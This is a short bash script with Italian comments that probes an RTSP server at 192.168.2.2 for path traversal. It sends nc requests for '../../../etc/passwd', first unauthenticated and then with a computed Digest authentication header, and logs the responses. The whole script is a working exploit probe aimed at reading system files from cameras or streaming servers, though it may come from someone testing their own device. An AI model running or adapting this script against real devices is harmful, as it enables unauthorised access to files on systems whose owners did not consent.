#!/usr/bin/env bash
set -euo pipefail

IP="192.168.2.2"
OUT="injection.txt"

#   export RTSP_USER="il_tuo_username"
#   export RTSP_PASS="la_tua_password"
USER="${RTSP_USER:-}"
PASS="${RTSP_PASS:-}"

# Funzione MD5 → esadecimale
md5_hex(){
  printf '%s' "${1:-}" \
    | openssl dgst -md5 -binary \
    | xxd -p -c 256
}

: > "$OUT"

########################################
# 1) Path Traversal SENZA auth
########################################
echo "=== Path Traversal Test (no auth) ===" | tee -a "$OUT"
printf 'DESCRIBE rtsp://%s/../../../etc/passwd RTSP/1.0\r\nCSeq: 1\r\n\r\n' "$IP" \
  | nc -w2 "$IP" 554 2>&1 | tee -a "$OUT"
echo | tee -a "$OUT"

########################################
# 2) Se hai user/pass, prova con Digest
########################################
if [[ -n "$USER" && -n "$PASS" ]]; then
  echo "=== Performing Digest-authized Path Traversal ===" | tee -a "$OUT"

  # 2a) prendo realm & nonce
  RESP=$( printf 'DESCRIBE rtsp://%s/ RTSP/1.0\r\nCSeq: 2\r\n\r\n' "$IP" \
           | nc -w2 "$IP" 554 )
  REALM=$( echo "$RESP" | grep -oE 'realm="[^"]+"' | cut -d'"' -f2 )
  NONCE=$( echo "$RESP" | grep -oE 'nonce="[^"]+"' | cut -d'"' -f2 )

  echo "Obtained realm=\"$REALM\" nonce=\"$NONCE\"" | tee -a "$OUT"
  echo | tee -a "$OUT"

  # 2b) calcolo response Digest
  HA1=$( md5_hex "${USER}:${REALM}:${PASS}" )
  HA2=$( md5_hex "DESCRIBE:rtsp://$IP/../../../etc/passwd" )
  RESPONSE=$( md5_hex "${HA1}:${NONCE}:${HA2}" )
  AUTH_HDR="Authorization: Digest username=\"$USER\", realm=\"$REALM\", nonce=\"$NONCE\", uri=\"rtsp://$IP/../../../etc/passwd\", response=\"$RESPONSE\""

  # 2c) mando la request autenticata
  printf 'DESCRIBE rtsp://%s/../../../etc/passwd RTSP/1.0\r\nCSeq: 3\r\n%s\r\n\r\n' \
    "$IP" \
    "$AUTH_HDR" \
    | nc -w2 "$IP" 554 2>&1 | tee -a "$OUT"

  echo | tee -a "$OUT"
else
  echo "RTSP_USER/RTSP_PASS non definite: salto il test con Digest-auth" | tee -a "$OUT"
fi

echo -e "\nDone. Vedi i risultati in $OUT\n"

